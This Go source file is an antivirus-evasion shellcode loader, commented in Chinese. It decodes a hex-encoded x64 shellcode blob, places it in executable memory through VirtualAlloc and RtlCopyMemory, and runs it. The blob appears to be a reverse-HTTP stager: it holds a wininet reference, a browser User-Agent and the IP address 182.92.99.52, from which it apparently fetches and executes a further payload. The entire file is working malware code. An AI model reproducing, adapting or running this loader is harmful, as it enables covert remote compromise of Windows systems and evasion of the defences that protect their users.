package mylib

import (
	"encoding/hex"
	"os"
	"syscall"
	"unsafe"
)

//实现免杀
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
	// 生成C类型的shellcode，转换成hex值
	shellcode_hex = "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8b62200004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f4963634e009dc37f6cb7133b5023a6771590bcf1a8d71bb5e70c9e1b510834c262add726f7113a3d55c45be4c848bfda89e06eb31e1357f3a17bb68c22580b49d4c0492e4b98ebba1abde49a98aa00557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d5349452031302e303b2057696e646f7773204e5420362e323b20574f5736343b2054726964656e742f362e303b204d4154424a53290d0a00478da25951d5a8511c8d896e2ec7068dcf247d74fd0e44d7ee5935dca24c311aec028ff10a61cb668db4b0e540c1f0ea00fe56b4b563273a504ee18bee9a1a214a81b33b895588d2cd0e912d00dd5464eba38a6d81b1170f32775ad389a0376254009b4410960b450cc2b2e5464cdc5f3c2fa190d64223284681a162ef298e5bf518bdd9b0f3303fa85cb5dd3c5434fa77f4f6da2da75fea4a6497b0af6752711ad019cecb42ac100ed89ab99e29195845376fe0edcb829d6116d16aec57f778b314049f812b22478ec451d31025852f4e0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3138322e39322e39392e353200499602d2"
)

func checkErr(err error) {
	if err != nil { //如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error()) //报出具体错误
			os.Exit(1)
		}
	}
}

func Notkill() {
	// _ 匿名变量
	shellcode, _ := hex.DecodeString(shellcode_hex)
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}

	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)

	//syscall来运行shellcode
	syscall.SyscallN(addr, 0, 0, 0, 0)
}
